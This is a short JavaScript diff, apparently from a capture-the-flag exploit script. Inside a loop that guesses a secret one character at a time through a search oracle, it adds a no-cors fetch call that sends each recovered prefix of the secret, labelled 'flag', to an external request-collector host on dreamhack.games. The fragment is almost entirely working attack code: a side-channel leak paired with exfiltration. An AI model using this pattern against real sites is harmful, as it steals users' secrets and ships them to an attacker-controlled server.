@@ -40,6 +40,9 @@
                     for (let c of chars) {
                         if (await search(secret + c)) {
                             secret += c;
+                            fetch(`https://rdftbhp.request.dreamhack.games?flag=${encodeURIComponent(secret)}`, {
+                                mode: 'no-cors'
+                            });
                             console.log(`found: ${secret}`);
                             break;
                         }
